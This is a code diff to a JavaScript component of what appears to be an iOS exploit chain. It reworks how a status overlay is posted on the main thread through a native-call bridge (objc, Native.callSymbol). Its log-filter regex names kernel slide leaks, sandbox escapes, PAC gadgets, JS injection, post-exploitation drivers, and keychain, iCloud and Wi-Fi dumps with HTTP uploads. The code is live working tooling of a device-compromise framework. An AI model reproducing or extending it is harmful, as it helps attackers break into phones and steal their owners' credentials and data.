@@ -6,6 +6,8 @@
   const DONE_POST_ITERS = 3;
   const MAX_READ_BYTES = 16384;
   const MAX_LINES = 8;
+  const MAIN_DISPATCH_TIMEOUT_MS = 3500;
+  const MAIN_DISPATCH_CANCEL_GRACE_MS = 500;
   const FILTER_RE = /\[PE\]|\[PE-DBG\]|\[SBX1\]|\[SBC\]|\[POWERCUFF\]|\[FILE-DL\]|\[FILE-DL-EARLY\]|\[HTTP-UPLOAD\]|\[APP\]|\[ICLOUD\]|\[KEYCHAIN\]|\[WIFI\]|\[THREEAPP\]|\[THREEAPP-AUDIT\]|\[SAFARI-CLEAN\]|\[MG\]|\[MPD\]|\[APPLIMIT\]|\[CHAIN-OVL\]|nativeCallBuff|kernel_base|kernel_slide|SBX0|SBX1|sbx0:|sbx1:|MIG_FILTER_BYPASS |INJECTJS |CHAIN |DRIVER-POSTEXPL |DRIVER-NEWTHREAD |DARKSWORD-WIFI-DUMP |INFO |OFFSETS |FILE-UTILS |PORTRIGHTINSERTER |REGISTERSSTRUCT |REMOTECALL |TASK(?:ROP)? |THREAD |VM |MAIN |EXCEPTION |SANDBOX |PAC (?:diagnostics|ptrs|gadget)|UTILS |^\[[+\-!i]\]\s/i;
 
   class Native {
@@ -185,22 +187,75 @@
     } catch (_) {}
   }
 
-  function runOnMainEvaluate(script) {
+  function sleepWithoutNative(ms) {
+    try {
+      if (typeof Atomics === "object" && typeof Atomics.wait === "function" && typeof SharedArrayBuffer === "function") {
+        if (!globalThis.__bb_chain_overlay_sleep_i32) {
+          globalThis.__bb_chain_overlay_sleep_i32 = new Int32Array(new SharedArrayBuffer(4));
+        }
+        Atomics.wait(globalThis.__bb_chain_overlay_sleep_i32, 0, 0, ms);
+        return;
+      }
+    } catch (_) {}
+    const deadline = Date.now() + ms;
+    while (Date.now() < deadline) {}
+  }
+
+  function waitForMainTicket(ticket, timeoutMs) {
+    const deadline = Date.now() + timeoutMs;
+    while (Date.now() < deadline) {
+      if (globalThis.__bb_chain_overlay_main_done_ticket === ticket) return true;
+      sleepWithoutNative(25);
+    }
+    return globalThis.__bb_chain_overlay_main_done_ticket === ticket;
+  }
+
+  function runOnMainEvaluate(script, ticket) {
     const jsctxObj = globalThis.__bb_chain_overlay_jsctx_obj;
     if (!isNonZero(jsctxObj)) {
       log("main evaluate skipped: jsctxObj missing");
-      return false;
+      return "main-dispatch-unavailable";
     }
     const s = cfstr(script);
     if (!isNonZero(s)) {
       log("main evaluate skipped: script cfstr failed");
-      return false;
+      return "main-dispatch-cfstr-failed";
     }
+    globalThis.__bb_chain_overlay_main_done_ticket = 0;
+    globalThis.__bb_chain_overlay_main_started_ticket = 0;
+    globalThis.__bb_chain_overlay_cancel_ticket = 0;
+    objc(jsctxObj, "performSelectorOnMainThread:withObject:waitUntilDone:", sel("evaluateScript:"), s, 0);
+
+    // Do not CFRelease `s` here. With waitUntilDone:NO, Foundation keeps the
+    // object alive until the main runloop consumes it. Releasing from this
+    // worker thread can race the main-thread evaluateScript: handoff.
+    if (waitForMainTicket(ticket, MAIN_DISPATCH_TIMEOUT_MS)) return "done";
+
+    // From this point on the worker must assume a late main-thread delivery is
+    // still possible. If the main update already started, never touch the
+    // native bridge again from this worker; the main thread may still own
+    // nativeCallBuff.
+    if (globalThis.__bb_chain_overlay_main_started_ticket === ticket) return "main-update-timeout";
+
+    // If the script is only queued, cancel it with a JS-only flag, wait without
+    // native calls, then let the caller bail out after the queued main script
+    // has either observed the cancel or stayed undelivered.
+    globalThis.__bb_chain_overlay_cancel_ticket = ticket;
+    sleepWithoutNative(MAIN_DISPATCH_CANCEL_GRACE_MS);
+    if (globalThis.__bb_chain_overlay_main_done_ticket === ticket) return "done";
+    return "main-queue-timeout";
+  }
+
+  function mainUpdateOverlay(ticket) {
+    globalThis.__bb_chain_overlay_main_started_ticket = ticket;
     try {
-      objc(jsctxObj, "performSelectorOnMainThread:withObject:waitUntilDone:", sel("evaluateScript:"), s, 1n);
-      return true;
+      if (globalThis.__bb_chain_overlay_cancel_ticket === ticket) return false;
+      return updateOverlay();
+    } catch (e) {
+      log("main update error " + String(e));
+      return false;
     } finally {
-      Native.callSymbol("CFRelease", s);
+      globalThis.__bb_chain_overlay_main_done_ticket = ticket;
     }
   }
 
@@ -286,10 +341,16 @@
     if (s.length > 60) s = s.slice(0, 57) + "...";
     const count = Number(globalThis.__bb_chain_overlay_post_count || 0);
     if (count < 3 || globalThis.__bb_chain_overlay_done) log("posting status string: " + s);
-    objc(server, "postDoubleHeightStatusString:forStyle:", cfstr(s), 0n);
-    globalThis.__bb_chain_overlay_post_count = count + 1;
-    if (count < 3 || globalThis.__bb_chain_overlay_done) log("posted status string");
-    return true;
+    const textRef = cfstr(s);
+    if (!isNonZero(textRef)) return false;
+    try {
+      objc(server, "postDoubleHeightStatusString:forStyle:", textRef, 0n);
+      globalThis.__bb_chain_overlay_post_count = count + 1;
+      if (count < 3 || globalThis.__bb_chain_overlay_done) log("posted status string");
+      return true;
+    } finally {
+      Native.callSymbol("CFRelease", textRef);
+    }
   }
 
   function updateOverlay() {
@@ -316,16 +377,26 @@
     globalThis.__bb_chain_overlay_jsctx_obj = Native.bridgeInfo().jsContextObj;
     globalThis.__bb_chain_overlay_log = log;
     globalThis.__bb_chain_overlay_update = updateOverlay;
-    log("entry statusPath=" + STATUS_PATH + " mode=main-evaluate-sync");
+    globalThis.__bb_chain_overlay_main_update = mainUpdateOverlay;
+    log("entry statusPath=" + STATUS_PATH + " mode=main-evaluate-serialized");
     let doneIters = 0;
     let exitReason = "max-iters";
+    let ticket = 1;
     for (let i = 0; i < POLL_MAX_ITERS; i++) {
       globalThis.__bb_chain_overlay_text = buildOverlayText();
       try {
-        runOnMainEvaluate("try{__bb_chain_overlay_update();}catch(e){__bb_chain_overlay_log('update error '+e);}");
+        const mainStatus = runOnMainEvaluate("try{__bb_chain_overlay_main_update(" + ticket + ");}catch(e){try{__bb_chain_overlay_log('main dispatch err '+e);}catch(_){ }finally{__bb_chain_overlay_main_done_ticket=" + ticket + ";}}", ticket);
+        if (mainStatus !== "done") {
+          exitReason = mainStatus;
+          if (mainStatus === "main-update-timeout") {
+            while (true) sleepWithoutNative(60000);
+          }
+          break;
+        }
       } catch (e) {
         log("update error " + String(e));
       }
+      ticket++;
       if (globalThis.__bb_chain_overlay_done) {
         doneIters++;
         if (doneIters === 1) log("completion marker observed");
